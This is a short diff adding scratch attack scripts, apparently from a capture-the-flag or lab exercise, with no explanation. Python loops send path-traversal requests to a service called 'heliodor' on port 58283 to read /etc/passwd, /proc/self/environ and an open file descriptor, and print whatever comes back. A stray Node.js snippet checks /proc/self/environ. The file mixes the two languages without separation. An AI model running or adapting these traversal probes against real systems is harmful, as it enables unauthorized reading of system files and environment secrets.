@@ -1,0 +1,20 @@
+import requests
+while True:
+    requests.get("http://heliodor:58283/query/view/..etc.passwd")
+    
+import requests
+while True:
+    res=requests.get("http://heliodor:58283/query/view/..proc.self.environ")
+    if res.text != "":
+        print("find : " +res.text)
+    
+while True:
+    r = requests.get("http://heliodor:58283/query/view/..proc..self..fd..21").text
+    if "error" not in r:
+        print("find : " +r)
+        
+var fs = require('fs')
+ 
+fs.stat('/proc/self/environ', (error, stats) => {
+   console.log(stats)
+})
